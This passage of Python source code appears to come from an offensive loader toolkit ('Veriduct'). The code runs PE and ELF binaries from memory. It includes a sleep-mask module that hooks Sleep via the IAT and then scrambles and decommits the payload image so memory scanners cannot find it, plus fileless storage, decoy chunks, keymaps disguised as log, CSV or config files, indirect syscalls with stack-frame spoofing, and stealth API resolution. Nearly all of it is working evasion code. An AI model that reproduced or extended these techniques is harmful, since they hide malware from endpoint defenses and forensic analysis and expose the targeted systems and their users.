                ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t,
                ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
            )(vp)
        if vf:
            self._VirtualFree = ctypes.WINFUNCTYPE(
                ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong
            )(vf)

        # Resolve NtDelayExecution for the actual sleep
        # Try indirect syscall first, then standard resolution
        if self._syscall_eng:
            # Manually extract SSN for NtDelayExecution if not already cached
            nt_delay_addr = resolver.get_proc_address("ntdll.dll", "NtDelayExecution")
            if nt_delay_addr:
                ssn = self._syscall_eng._read_ssn_from_stub(nt_delay_addr)
                if ssn is not None and "NtDelayExecution" not in self._syscall_eng._ssn_cache:
                    self._syscall_eng._ssn_cache["NtDelayExecution"] = ssn
                    logging.debug(f"SleepMask: Registered NtDelayExecution SSN=0x{ssn:04X}")

    # ------------------------------------------------------------------
    # IAT Hook Callbacks
    # ------------------------------------------------------------------

    def create_sleep_hook(self):
        """
        Create a ctypes callback for Sleep() IAT hook.

        Returns the callback's address (int) for writing into the IAT.
        The callback object is stored on self to prevent garbage collection.

        Signature: void WINAPI Sleep(DWORD dwMilliseconds)
        """
        @ctypes.WINFUNCTYPE(None, ctypes.c_ulong)
        def _sleep_hook(dw_milliseconds):
            self._mask_sleep_unmask(dw_milliseconds)

        self._sleep_callback = _sleep_hook
        _pinned_callbacks.append(self._sleep_callback)  # FIX 2: prevent GC
        addr = ctypes.cast(self._sleep_callback, ctypes.c_void_p).value
        logging.info(f"SleepMask: Sleep hook callback @ 0x{addr:X}")
        return addr

    def create_sleep_ex_hook(self):
        """
        Create a ctypes callback for SleepEx() IAT hook.

        Signature: DWORD WINAPI SleepEx(DWORD dwMilliseconds, BOOL bAlertable)
        """
        @ctypes.WINFUNCTYPE(ctypes.c_ulong, ctypes.c_ulong, ctypes.c_int)
        def _sleep_ex_hook(dw_milliseconds, b_alertable):
            self._mask_sleep_unmask(dw_milliseconds)
            return 0  # WAIT_OBJECT_0

        self._sleep_ex_callback = _sleep_ex_hook
        _pinned_callbacks.append(self._sleep_ex_callback)  # FIX 2: prevent GC
        addr = ctypes.cast(self._sleep_ex_callback, ctypes.c_void_p).value
        logging.info(f"SleepMask: SleepEx hook callback @ 0x{addr:X}")
        return addr

    # ------------------------------------------------------------------
    # Core Mask / Unmask Cycle
    # ------------------------------------------------------------------

    def _mask_sleep_unmask(self, sleep_ms: int):
        """
        Full mask cycle: capture -> shatter -> free -> sleep -> reconstruct.

        Runs in the PE's thread context (called via IAT hook).
        The PE's thread stack is a separate allocation and survives.
        """
        if sleep_ms == 0:
            # Zero-length sleep — no point masking, just yield
            return

        self._mask_count += 1
        cycle_id = self._mask_count

        logging.debug(f"SleepMask: Cycle {cycle_id} — masking for {sleep_ms}ms")

        try:
            # === PHASE 1: Capture PE image ===
            image_snapshot = self._capture_image()
            if not image_snapshot:
                logging.warning(f"SleepMask: Capture failed, sleeping unmasked")
                self._raw_sleep(sleep_ms)
                return

            # === PHASE 2: Shatter + Entangle + Scatter into Python heap ===
            self._scatter(image_snapshot)
            del image_snapshot  # Free the contiguous copy immediately

            # === PHASE 3: Free the PE image region ===
            if not self._free_pe_region():
                logging.warning(f"SleepMask: Free failed, reconstructing immediately")
                self._reconstruct()
                self._raw_sleep(sleep_ms)
                return

            self._masked = True
            logging.debug(f"SleepMask: PE annihilated — {len(self._scattered_chunks)} chunks in Python heap")

            # === PHASE 4: Sleep ===
            # PE memory does not exist during this window.
            # Chunks are Python objects — indistinguishable from app data.
            self._raw_sleep(sleep_ms)

            # === PHASE 5: Reconstruct ===
            if not self._reconstruct():
                # CRITICAL: Reconstruction failed — PE cannot resume.
                # This is catastrophic. Log and let the thread crash cleanly.
                logging.error(f"SleepMask: CRITICAL — reconstruction failed, PE will crash")
                self._masked = False
                return

            self._masked = False
            logging.debug(f"SleepMask: Cycle {cycle_id} — PE restored, resuming")

        except Exception as e:
            logging.error(f"SleepMask: Cycle {cycle_id} error — {e}")
            # Try to recover if we're in masked state
            if self._masked and self._scattered_chunks:
                try:
                    self._reconstruct()
                    self._masked = False
                except Exception:
                    logging.error(f"SleepMask: Recovery failed — PE will crash")

    # ------------------------------------------------------------------
    # Phase 1: Image Capture
    # ------------------------------------------------------------------

    def _capture_image(self) -> Optional[bytes]:
        """
        Read the entire PE image from memory into a Python bytes object.

        This captures the live state: relocated addresses, filled IAT,
        modified .data sections, etc.
        """
        try:
            snapshot = ctypes.string_at(self.pe_base, self.pe_size)
            logging.debug(f"SleepMask: Captured {len(snapshot)} bytes from 0x{self.pe_base:X}")
            return snapshot
        except OSError as e:
            logging.error(f"SleepMask: Failed to read PE image: {e}")
            return None

    # ------------------------------------------------------------------
    # Phase 2: Scatter (SSM + Entangle + Chunk)
    # ------------------------------------------------------------------

    def _scatter(self, image_data: bytes):
        """
        Split the PE image into chunks, apply SSM and entanglement,
        store as Python objects in managed heap.
        """
        # Split into chunks
        raw_chunks = []
        for i in range(0, len(image_data), self.chunk_size):
            raw_chunks.append(image_data[i:i + self.chunk_size])

        # Apply Semantic Shatter Mapping
        ssm_seeds = []
        ssm_inserts = []
        shattered_chunks = []
        for chunk in raw_chunks:
            shattered, seed, inserts = semantic_shatter(
                chunk, null_insert_rate=self.ssm_null_rate
            )
            shattered_chunks.append(shattered)
            ssm_seeds.append(seed)
            ssm_inserts.append(inserts)

        # Apply XOR Entanglement
        entangled, entanglement_info = entangle_chunks(
            shattered_chunks, self.entanglement_groups
        )

        # Store everything as Python objects (lives in managed heap)
        self._scattered_chunks = entangled
        self._ssm_seeds = ssm_seeds
        self._ssm_inserts = ssm_inserts
        self._entanglement_info = entanglement_info

        logging.debug(
            f"SleepMask: Scattered into {len(entangled)} chunks, "
            f"{len(entanglement_info.get('groups', []))} entanglement groups"
        )

    # ------------------------------------------------------------------
    # Phase 3: Free PE Region
    # ------------------------------------------------------------------

    def _free_pe_region(self) -> bool:
        """
        Decommit the PE image memory region (FIX 4, v2.3).

        Uses MEM_DECOMMIT instead of MEM_RELEASE.  MEM_RELEASE frees the
        entire VA range back to the OS — during sleep, Python's GC, the OS
        thread pool, or any background allocation can claim that range,
        making re-allocation at the same base impossible.

        MEM_DECOMMIT releases the physical pages (nothing for memory scanners
        to find) but keeps the virtual address range reserved.  Re-committing
        on wake via VirtualAlloc(MEM_COMMIT) is guaranteed to succeed because
        we still own the reservation.

        NtFreeVirtualMemory: size must be non-zero for MEM_DECOMMIT (unlike
        MEM_RELEASE where size must be 0).
        """
        MEM_DECOMMIT = 0x4000

        if self._syscall_eng:
            success = self._syscall_eng.nt_free(self.pe_base, self.pe_size, MEM_DECOMMIT)
            if success:
                logging.debug(f"SleepMask: Decommitted PE region via indirect syscall")
                return True
            logging.debug("SleepMask: Indirect syscall decommit failed, trying fallback")

        if self._VirtualFree:
            result = self._VirtualFree(self.pe_base, self.pe_size, MEM_DECOMMIT)
            if result:
                logging.debug(f"SleepMask: Decommitted PE region via VirtualFree")
                return True

        logging.error("SleepMask: Failed to decommit PE region")
        return False

    # ------------------------------------------------------------------
    # Phase 4: Sleep
    # ------------------------------------------------------------------

    def _raw_sleep(self, duration_ms: int):
        """
        Execute the actual sleep via NtDelayExecution.

        When SyscallEngine is available, this goes through the indirect
        syscall trampoline with RBP-chain spoofing — the sleeping thread's
        stack looks like a legitimate ntdll wait.

        NtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval)
        DelayInterval is in 100ns units, negative = relative.
        """
        if duration_ms <= 0:
            return

        # Convert ms to 100ns intervals (negative = relative)
        delay_100ns = ctypes.c_longlong(-duration_ms * 10000)

        if self._syscall_eng:
            fn = self._syscall_eng.get_syscall_func(
                "NtDelayExecution",
                ctypes.c_long,      # NTSTATUS
                ctypes.c_int,       # Alertable (BOOLEAN)
                ctypes.c_void_p,    # DelayInterval (PLARGE_INTEGER)
            )
            if fn:
                fn(ctypes.c_int(0), ctypes.byref(delay_100ns))
                return

        # Fallback: resolve NtDelayExecution via stealth (still in ntdll, but
        # goes through the function prologue — may hit hooks)
        resolver = get_stealth_resolver()
        delay_addr = resolver.get_proc_address("ntdll.dll", "NtDelayExecution")
        if delay_addr:
            NtDelayExecution = ctypes.WINFUNCTYPE(
                ctypes.c_long, ctypes.c_int, ctypes.c_void_p
            )(delay_addr)
            NtDelayExecution(ctypes.c_int(0), ctypes.byref(delay_100ns))
            return

        # Last resort: Python time.sleep (breaks stealth but keeps functionality)
        import time
        time.sleep(duration_ms / 1000.0)

    # ------------------------------------------------------------------
    # Phase 5: Reconstruct
    # ------------------------------------------------------------------

    def _reconstruct(self) -> bool:
        """
        Re-allocate PE at the same base address, reverse transforms,
        copy image back, re-apply section protections.

        Returns True on success, False on critical failure.
        """
        if not self._scattered_chunks:
            logging.error("SleepMask: No chunks to reconstruct from")
            return False

        # --- Step 1: Reverse transforms ---
        try:
            # Disentangle
            chunks = disentangle_chunks(self._scattered_chunks, self._entanglement_info)

            # Unshatter
            plain_chunks = []
            for i, chunk in enumerate(chunks):
                if i < len(self._ssm_seeds) and self._ssm_seeds[i]:
                    plain = semantic_unshatter(chunk, self._ssm_seeds[i], self._ssm_inserts[i])
                    plain_chunks.append(plain)
                else:
                    plain_chunks.append(chunk)

            image_data = b''.join(plain_chunks)
        except Exception as e:
            logging.error(f"SleepMask: Transform reversal failed: {e}")
            return False

        if len(image_data) != self.pe_size:
            logging.warning(
                f"SleepMask: Reconstructed size mismatch "
                f"({len(image_data)} vs {self.pe_size}), padding/truncating"
            )
            if len(image_data) < self.pe_size:
                image_data += b'\x00' * (self.pe_size - len(image_data))
            else:
                image_data = image_data[:self.pe_size]

        # --- Step 2: Re-commit at the same base (FIX 4, v2.3) ---
        # We used MEM_DECOMMIT (not MEM_RELEASE), so the VA reservation is
        # still ours.  MEM_COMMIT alone re-backs the pages with physical memory.
        # This cannot fail due to address contention — the range is reserved.
        MEM_COMMIT = 0x1000
        base_addr = 0

        if self._syscall_eng:
            base_addr = self._syscall_eng.nt_alloc(
                self.pe_base, self.pe_size, MEM_COMMIT, PAGE_READWRITE
            )

        if not base_addr and self._VirtualAlloc:
            result = self._VirtualAlloc(
                self.pe_base, self.pe_size, MEM_COMMIT, PAGE_READWRITE
            )
            if result:
                base_addr = result if isinstance(result, int) else ctypes.cast(result, ctypes.c_void_p).value

        if not base_addr:
            logging.error(
                f"SleepMask: CRITICAL — failed to re-commit at 0x{self.pe_base:X}. "
                f"This should not happen with MEM_DECOMMIT strategy."
            )
            return False

        if base_addr != self.pe_base:
            logging.error(
                f"SleepMask: CRITICAL — re-committed at 0x{base_addr:X}, "
                f"needed 0x{self.pe_base:X}. Cannot safely resume."
            )
            if self._syscall_eng:
                self._syscall_eng.nt_free(base_addr)
            elif self._VirtualFree:
                self._VirtualFree(base_addr, 0, 0x8000)
            return False

        # --- Step 3: Copy image back ---
        try:
            ctypes.memmove(self.pe_base, image_data, len(image_data))
        except Exception as e:
            logging.error(f"SleepMask: Failed to write image: {e}")
            return False

        # --- Step 4: Re-apply section protections ---
        for section in self.sections:
            protection = self._translate_section_protection(section['char'])
            if protection == PAGE_NOACCESS:
                continue

            if self._syscall_eng:
                success, _ = self._syscall_eng.nt_protect(
                    section['addr'], section['size'], protection
                )
                if not success and self._VirtualProtect:
                    old = ctypes.c_ulong()
                    self._VirtualProtect(
                        section['addr'], section['size'],
                        protection, ctypes.byref(old)
                    )
            elif self._VirtualProtect:
                old = ctypes.c_ulong()
                self._VirtualProtect(
                    section['addr'], section['size'],
                    protection, ctypes.byref(old)
                )

        # --- Step 5: Clear scatter state ---
        self._scattered_chunks = None
        self._ssm_seeds = None
        self._ssm_inserts = None
        self._entanglement_info = None

        logging.debug(f"SleepMask: PE restored at 0x{self.pe_base:X}")
        return True

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _translate_section_protection(characteristics):
        """Map PE section characteristics to page protection constants."""
        can_exec = bool(characteristics & IMAGE_SCN_MEM_EXECUTE)
        can_read = bool(characteristics & IMAGE_SCN_MEM_READ)
        can_write = bool(characteristics & IMAGE_SCN_MEM_WRITE)

        if can_exec:
            if can_read and can_write:
                return PAGE_EXECUTE_READWRITE
            if can_read:
                return PAGE_EXECUTE_READ
            if can_write:
                return PAGE_EXECUTE_READWRITE
            return PAGE_EXECUTE
        if can_read and can_write:
            return PAGE_READWRITE
        if can_read:
            return PAGE_READONLY
        if can_write:
            return PAGE_READWRITE
        return PAGE_NOACCESS



class MemorySubstrate:
    """
    In-memory filesystem for fileless execution.
    Binaries exist only as Python bytes objects, never touching disk.
    """
    def __init__(self):
        self._storage = {}  # path -> bytes
        self._metadata = {}  # path -> metadata
        logging.debug("MemorySubstrate initialized")

    def write_file(self, path: str, data: bytes):
        """Write binary data to memory path"""
        self._storage[path] = data
        self._metadata[path] = {
            'size': len(data),
            'created': datetime.datetime.now().isoformat(),
            'type': 'file'
        }
        logging.debug(f"Wrote {len(data)} bytes to memory path: {path}")

    def read_file(self, path: str) -> Optional[bytes]:
        """Read binary data from memory path"""
        return self._storage.get(path)

    def exists(self, path: str) -> bool:
        return path in self._storage

    def get_size(self) -> int:
        return sum(len(data) for data in self._storage.values())

    def list_files(self) -> List[str]:
        return list(self._storage.keys())

# ==============================================================================
# Cryptographic & Transformation Primitives
# ==============================================================================

def calculate_salted_chunk_hash(salt: bytes, chunk_data: bytes) -> str:
    """Calculate salted hash for chunk identification."""
    return hashlib.sha256(salt + chunk_data).hexdigest()

def calculate_file_hash(filepath: str) -> str:
    """Calculate hash of entire file for verification."""
    sha256_hash = hashlib.sha256()
    try:
        with open(filepath, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b''):
                sha256_hash.update(chunk)
        return sha256_hash.hexdigest()
    except Exception as e:
        logging.error(f"Error calculating hash for '{filepath}': {e}")
        return None

def calculate_hmac(key: bytes, message: bytes) -> str:
    """Calculate HMAC for tamper detection."""
    return hmac.new(key, message, hashlib.sha256).hexdigest()

def variable_chunk_sizes(data_stream: Iterator[bytes], base_size: int, jitter: float = 0.0) -> Iterator[bytes]:
    """
    Generator for variable-sized chunks with optional jitter.
    If jitter=0, uses fixed size for compatibility.
    """
    buffer = b''
    for chunk in data_stream:
        buffer += chunk
        while len(buffer) >= base_size:
            if jitter > 0:
                jitter = max(0.0, min(0.5, jitter))
                size = int(base_size * (1 - jitter + 2 * jitter * random.random()))
                size = max(64, min(size, len(buffer)))
            else:
                size = min(base_size, len(buffer))
            yield buffer[:size]
            buffer = buffer[size:]
    if buffer:
        yield buffer

def semantic_shatter(data: bytes, ssm_seed: bytes = None, null_insert_rate: float = 0.01) -> Tuple[bytes, bytes, List[int]]:
    """
    Reversible semantic shatter mapping with bounds checking.
    """
    if ssm_seed is None:
        ssm_seed = os.urandom(16)
    null_insert_rate = max(0.0, min(0.1, null_insert_rate))
    rng = random.Random(int.from_bytes(ssm_seed, "big"))
    n = len(data)
    if n == 0:
        return data, ssm_seed, []
    order = list(range(n))
    rng.shuffle(order)
    shattered = bytearray()
    insert_positions = []
    for idx in order:
        if rng.random() < null_insert_rate:
            insert_positions.append(len(shattered))
            shattered.append(0)
        shattered.append(data[idx])
    return bytes(shattered), ssm_seed, insert_positions

def semantic_unshatter(shattered: bytes, ssm_seed: bytes, insert_positions: List[int]) -> bytes:
    """Reverse semantic shatter mapping."""
    if not shattered:
        return b''
    rng = random.Random(int.from_bytes(ssm_seed, "big"))
    k = len(insert_positions)
    original_len = len(shattered) - k
    if original_len <= 0:
        return b''
    order = list(range(original_len))
    rng.shuffle(order)
    insert_set = set(insert_positions)
    source_positions = [pos for pos in range(len(shattered)) if pos not in insert_set]
    if len(source_positions) != original_len:
        raise ValueError("SSM metadata mismatch during unshatter")
    out = bytearray(original_len)
    for write_pos, orig_idx in enumerate(order):
        out[orig_idx] = shattered[source_positions[write_pos]]
    return bytes(out)

def entangle_chunks(chunks: List[bytes], group_size: int = 3) -> Tuple[List[bytes], Dict]:
    """
    Reversible XOR entanglement with correct variable-size handling.
    
    CRITICAL FIX: Store full-length XOR state to preserve all bits needed for
    correct disentanglement. Original lengths are tracked in metadata for
    final truncation after disentanglement.
    
    The bug was: truncating entangled chunks to original length loses XOR state
    bits needed to reconstruct subsequent chunks in the group.
    """
    if group_size < 2:
        return chunks, {"groups": []}

    entangled = list(chunks)
    info = {"groups": []}

    for start in range(0, len(chunks), group_size):
        idxs = list(range(start, min(start + group_size, len(chunks))))
        if len(idxs) <= 1:
            continue

        originals = [chunks[i] for i in idxs]
        original_lengths = [len(x) for x in originals]
        maxlen = max(original_lengths)

        # FIX 10 (v2.5): Seed-derived random padding instead of constant 0xFF.
        # Constant padding creates byte-frequency artifacts in stored chunks.
        # The seed is derived from the group's content so padding is deterministic
        # and reproducible during disentanglement.
        padding_seed = hashlib.sha256(b''.join(originals)).digest()[:8]
        padding_rng = random.Random(int.from_bytes(padding_seed, 'big'))
        def _random_pad(data, target_len):
            pad_len = target_len - len(data)
            if pad_len <= 0:
                return bytearray(data)
            pad = bytearray(padding_rng.getrandbits(8) for _ in range(pad_len))
            return bytearray(data) + pad
        padded = [_random_pad(x, maxlen) for x in originals]
        padding_byte = None  # No longer a single byte; padding is random

        # Build cumulative XOR prefix
        prefix = []
        acc = bytearray(maxlen)
        for p in padded:
            for j in range(maxlen):
                acc[j] ^= p[j]
            prefix.append(bytes(acc))

        # FIX: Store FULL prefix length, not truncated to original
        # This preserves all XOR state bits needed for disentanglement
        for i, (idx, pref) in enumerate(zip(idxs, prefix)):
            entangled[idx] = pref  # Full maxlen, no truncation

        info["groups"].append({
            "idxs": idxs,
            "maxlen": maxlen,
            "original_lengths": original_lengths,
            "padding_seed": base64.b64encode(padding_seed).decode('ascii'),  # FIX 10
        })

    return entangled, info

def disentangle_chunks(entangled: List[bytes], info: Dict) -> List[bytes]:
    """
    Reverse XOR entanglement and restore original chunk lengths.
    
    The entangled chunks are stored at maxlen to preserve full XOR state.
    After disentanglement, we truncate to original_lengths.
    """
    out = list(entangled)
    for g in info.get("groups", []):
        idxs = g["idxs"]
        maxlen = g["maxlen"]
        original_lengths = g["original_lengths"]
        # FIX 10 (v2.5): Reconstruct padding from seed for proper reversal.
        # Legacy groups with "padding_byte" still work (backwards compat).
        padding_seed_b64 = g.get("padding_seed")
        padding_byte = g.get("padding_byte", 0xFF)  # legacy fallback

        # Entangled chunks should already be at maxlen
        prefix = []
        for i, idx in enumerate(idxs):
            chunk = out[idx]
            if len(chunk) < maxlen:
                logging.warning(f"Entangled chunk {idx} is {len(chunk)} bytes, expected {maxlen} - padding")
            if padding_seed_b64:
                # New-style: chunks stored at maxlen, no padding needed here
                padded_chunk = bytearray(chunk[:maxlen].ljust(maxlen, b'\x00'))
            else:
                # Legacy: constant padding byte
                padded_chunk = bytearray(chunk.ljust(maxlen, bytes([padding_byte])))
            prefix.append(padded_chunk)

        # Reverse the XOR chain
        originals = []
        prev = bytearray(maxlen)
        for p in prefix:
            orig = bytearray(maxlen)
            for j in range(maxlen):
                orig[j] = prev[j] ^ p[j]
            originals.append(bytes(orig))
            prev = p

        # NOW truncate to original lengths (after disentanglement is complete)
        for i, (idx, orig, orig_len) in enumerate(zip(idxs, originals, original_lengths)):
            out[idx] = orig[:orig_len]

    return out

# ==============================================================================
# Storage Layer
# ==============================================================================

class ChunkStorage:
    """Robust SQLite chunk storage - schema indistinguishable from generic blob store."""
    def __init__(self, db_path: str):
        self.db_path = db_path
        self.conn = sqlite3.connect(self.db_path)
        self.conn.execute("PRAGMA journal_mode=WAL;")
        # Clean schema: just hash -> blob, no metadata columns
        self.conn.execute("""
            CREATE TABLE IF NOT EXISTS chunks (
                hash TEXT PRIMARY KEY,
                data BLOB
            )
        """)
        self.conn.commit()
        logging.debug(f"ChunkStorage initialized at {db_path}")

    def store_chunks_batch(self, chunks_to_store: List[Tuple[str, bytes]]):
        """Store multiple chunks in a single transaction."""
        if not chunks_to_store:
            return
        with self.conn:
            self.conn.executemany(
                "INSERT OR REPLACE INTO chunks (hash, data) VALUES (?, ?)",
                chunks_to_store
            )
        logging.debug(f"Stored {len(chunks_to_store)} chunks")

    def retrieve_chunk(self, salted_chunk_hash: str) -> Optional[bytes]:
        """Retrieve a single chunk by hash."""
        cursor = self.conn.execute(
            "SELECT data FROM chunks WHERE hash = ?",
            (salted_chunk_hash,)
        )
        result = cursor.fetchone()
        return result[0] if result else None

    def get_chunk_count(self) -> int:
        """Get total number of chunks (real + fake are indistinguishable)."""
        cursor = self.conn.execute("SELECT COUNT(*) FROM chunks")
        return cursor.fetchone()[0]

    def close(self):
        if hasattr(self, 'conn') and self.conn:
            self.conn.close()
            logging.debug("ChunkStorage closed")

def derive_fake_salt(file_salt: bytes) -> bytes:
    """Derive a separate salt for fake chunks - only keymap holder knows the real salt."""
    return hmac.new(file_salt, b"veriduct_fake_salt_v1", hashlib.sha256).digest()

def generate_fake_chunks(real_chunk_count: int, file_salt: bytes, ratio: float = 0.25) -> List[Tuple[str, bytes]]:
    """
    Generate fake chunks for substrate poisoning.
    Uses a derived salt so fake chunk hashes are completely disjoint from real chunk hashes.
    The database cannot distinguish real from fake - only the keymap holder knows which hashes are real.
    """
    fake_salt = derive_fake_salt(file_salt)
    count = max(1, int(real_chunk_count * ratio))
    fakes = []
    for _ in range(count):
        fake_len = random.choice([256, 512, 1024, 2048, 4096])
        data = os.urandom(fake_len)
        # Hash with derived fake_salt - these hashes will never appear in keymap
        h = calculate_salted_chunk_hash(fake_salt, data)
        fakes.append((h, data))
    logging.debug(f"Generated {count} fake chunks (salt-isolated)")
    return fakes

# ==============================================================================
# Disguised Keymap Parsing
# ==============================================================================

def parse_disguised_key(key_path: str, style: str) -> dict:
    """Parse disguised keymap file."""
    try:
        with open(key_path, 'r') as f:
            content = f.read()
        
        if style == "csv":
            # Extract base64 from CSV format
            lines = content.strip().split('\n')
            if len(lines) < 2:
                raise ValueError("Invalid CSV format")
            # Data is in second column of last row
            data_line = lines[-1]
            parts = data_line.split(',')
            if len(parts) < 2:
                raise ValueError("Invalid CSV data row")
            encoded = parts[1].strip('"')
            compressed = base64.b64decode(encoded)
            
        elif style == "log":
            # Extract base64 from log format
            lines = content.strip().split('\n')
            if not lines:
                raise ValueError("Empty log file")
            last_line = lines[-1]
            # Format: timestamp level message - data:<base64>
            if " - data:" not in last_line:
                raise ValueError("Invalid log format")
            encoded = last_line.split(" - data:")[-1].strip()
            compressed = base64.b64decode(encoded)
            
        elif style == "conf":
            # Extract base64 from conf format
            lines = content.strip().split('\n')
            data_line = None
            for line in lines:
                if line.startswith('data='):
                    data_line = line
                    break
            if not data_line:
                raise ValueError("No data field in config")
            encoded = data_line.split('=', 1)[1].strip()
            compressed = base64.b64decode(encoded)
        else:
            raise ValueError(f"Unknown disguise format: {style}")
        
        # Decompress and parse JSON
        json_bytes = Compressor.decompress(compressed)
        key_map = json.loads(json_bytes.decode('utf-8'))
        logging.info(f"Successfully parsed disguised keymap ({style} format)")
        return key_map
        
    except Exception as e:
        logging.error(f"Failed to parse disguised keymap: {e}")
        raise

# ==============================================================================
# Native Binary Loader (PE/ELF)
# ==============================================================================

class VeriductNativeLoader:
    """
    Native binary loader for PE and ELF.
    Implements dynamic linking, relocation, and execution transfer in pure Python.
    """
    def __init__(self, raw_data_stream: bytearray, command_line: str = None, cloak_preset: str = None, cloak_custom: dict = None):
        self.stream = raw_data_stream
        self.is_valid = False
        self.entry_point = 0
        self.architecture = "Unknown"
        self.image_base = 0
        self.mapped_memory = None
        self.mapped_size = 0
        self.is_64bit = False
        self.load_config_rva = 0
        self.load_config_size = 0
        self.command_line = command_line  # Command line to pass to PE
        self.cloak_preset = cloak_preset
        self.cloak_custom = cloak_custom
        
        # Track all VirtualAlloc allocations for cleanup (prevents memory leaks)
        self._allocations = []
        self._VirtualFree = None  # Cached for cleanup

    def parse_headers(self):
        """Identifies file type and parses structures."""
        if len(self.stream) < 64:
            logging.error("Binary too small to parse")
            return

        if self.stream[:4] == b'\x7fELF':
            self.architecture = "ELF"
            self._parse_elf()
        elif self.stream[:2] == b'MZ':
            self.architecture = "PE"
            self._parse_pe()
            pe_offset = struct.unpack('<I', self.stream[0x3C:0x40])[0]
            print(f"PE offset: 0x{pe_offset:X}")
            print(f"PE signature: {self.stream[pe_offset:pe_offset+4]}")
            entry_rva = struct.unpack('<I', self.stream[pe_offset+40:pe_offset+44])[0]
            print(f"Entry RVA from header: 0x{entry_rva:X}")
            print(f"First 64 bytes at PE offset: {self.stream[pe_offset:pe_offset+64].hex()}")
        else:
            logging.error("Unknown executable format")
            self.is_valid = False

    # -------------------------------------------------------------------------
    # PE (Windows) Implementation
    # -------------------------------------------------------------------------
    
    def _translate_pe_section_protection(self, characteristics):
        """
        Translate PE section characteristics flags to Windows page protection constants.
        Maps section flags to minimum required permissions (no unnecessary RWX).
        """
        can_exec = bool(characteristics & IMAGE_SCN_MEM_EXECUTE)
        can_read = bool(characteristics & IMAGE_SCN_MEM_READ)
        can_write = bool(characteristics & IMAGE_SCN_MEM_WRITE)

        if can_exec:
            if can_read and can_write:
                return PAGE_EXECUTE_READWRITE  # Only if section explicitly needs E+R+W
            if can_read:
                return PAGE_EXECUTE_READ  # Standard .text section
            if can_write:
                # Uncommon: execute + write but not read
                return PAGE_EXECUTE_READWRITE
            return PAGE_EXECUTE

        # Non-executable sections
        if can_read and can_write:
            return PAGE_READWRITE  # .data section
        if can_read:
            return PAGE_READONLY  # .rdata section
        if can_write:
            return PAGE_READWRITE

        return PAGE_NOACCESS

    def _parse_pe(self):
        """Parse PE headers and extract critical information."""
        try:
            # DOS Header -> PE Header offset
            pe_offset = struct.unpack('<I', self.stream[0x3C:0x40])[0]
            if self.stream[pe_offset:pe_offset+4] != b'PE\0\0':
                logging.error("Invalid PE signature")
                return
            
            # File Header
            self.num_sections = struct.unpack('<H', self.stream[pe_offset+6:pe_offset+8])[0]
            opt_header_size = struct.unpack('<H', self.stream[pe_offset+20:pe_offset+22])[0]
            
            # Optional Header
            opt_header_offset = pe_offset + 24
            self.opt_header_offset = opt_header_offset  # Store for later use
            magic = struct.unpack('<H', self.stream[opt_header_offset:opt_header_offset+2])[0]
            
            is_64bit = (magic == 0x20b)
            
            # AddressOfEntryPoint (Offset 16)
            self.entry_point_rva = struct.unpack('<I', self.stream[opt_header_offset+16:opt_header_offset+20])[0]
            
            # ImageBase
            if is_64bit:
                self.image_base = struct.unpack('<Q', self.stream[opt_header_offset+24:opt_header_offset+32])[0]
            else:
                self.image_base = struct.unpack('<I', self.stream[opt_header_offset+28:opt_header_offset+32])[0]

            # SizeOfImage
            self.size_of_image = struct.unpack('<I', self.stream[opt_header_offset+56:opt_header_offset+60])[0]
            
            # Data Directories
            dd_offset = opt_header_offset + (112 if is_64bit else 96)
            
            # Import Table (Index 1)
            self.import_table_rva = struct.unpack('<I', self.stream[dd_offset+8:dd_offset+12])[0]
            
            # Reloc Table (Index 5)
            self.reloc_table_rva = struct.unpack('<I', self.stream[dd_offset+40:dd_offset+44])[0]
            self.reloc_table_size = struct.unpack('<I', self.stream[dd_offset+44:dd_offset+48])[0]
            
            # TLS Directory (Index 9)
            tls_rva = struct.unpack('<I', self.stream[dd_offset+72:dd_offset+76])[0]
            if tls_rva > 0:
                self.tls_directory_rva = tls_rva
                logging.debug(f"TLS Directory found at RVA 0x{tls_rva:X}")

            # Load Config Directory (Index 10)
            self.load_config_rva = struct.unpack('<I', self.stream[dd_offset+80:dd_offset+84])[0]
            self.load_config_size = struct.unpack('<I', self.stream[dd_offset+84:dd_offset+88])[0]
            
            # Store is_64bit
            self.is_64bit = is_64bit

            # Section headers offset
            self.section_header_offset = opt_header_offset + opt_header_size
            self.is_valid = True
            
            logging.info(f"PE parsed: {self.num_sections} sections, entry RVA: 0x{self.entry_point_rva:X}")
            
        except Exception as e:
            logging.error(f"PE Parse Error: {e}")
            self.is_valid = False

    def _execute_pe_windows(self):
        """
        Execute PE on Windows with proper memory mapping.
        
        Uses SyscallEngine for indirect syscalls + RBP-chain stack spoofing
        when available, with transparent fallback to standard stealth-resolved
        API calls.
        
        Indirect syscall path:
          Memory ops   -> NtAllocateVirtualMemory / NtProtectVirtualMemory / NtFreeVirtualMemory
          Thread ops   -> NtCreateThreadEx / NtWaitForSingleObject / NtClose
          All routed through ntdll syscall;ret gadgets with spoofed RBP frame chains
        
        Fallback path (original):
          Memory ops   -> kernel32!VirtualAlloc / VirtualProtect / VirtualFree
          Thread ops   -> kernel32!CreateThread / WaitForSingleObject / CloseHandle
          Resolved via StealthResolver (PEB walk + export table parsing)
        """
        resolver = get_stealth_resolver()
        
        # --- Try to initialize indirect syscall engine ---
        syscall_eng = None
        try:
            syscall_eng = get_syscall_engine()
            if not syscall_eng.available:
                syscall_eng = None
        except Exception as e:
            logging.debug(f"SyscallEngine not available: {e}")
            syscall_eng = None
        
        if syscall_eng:
            logging.info("PE Loader: Using INDIRECT SYSCALLS with stack frame spoofing")
        else:
            logging.info("PE Loader: Using standard stealth-resolved API calls")
        
        # --- Resolve fallback APIs (always needed for non-Nt operations) ---
        VirtualAlloc_addr = resolver.get_proc_address("kernel32.dll", "VirtualAlloc")
        VirtualProtect_addr = resolver.get_proc_address("kernel32.dll", "VirtualProtect")
        VirtualFree_addr = resolver.get_proc_address("kernel32.dll", "VirtualFree")
        CreateThread_addr = resolver.get_proc_address("kernel32.dll", "CreateThread")
        WaitForSingleObject_addr = resolver.get_proc_address("kernel32.dll", "WaitForSingleObject")
        GetExitCodeThread_addr = resolver.get_proc_address("kernel32.dll", "GetExitCodeThread")
        CloseHandle_addr = resolver.get_proc_address("kernel32.dll", "CloseHandle")
        
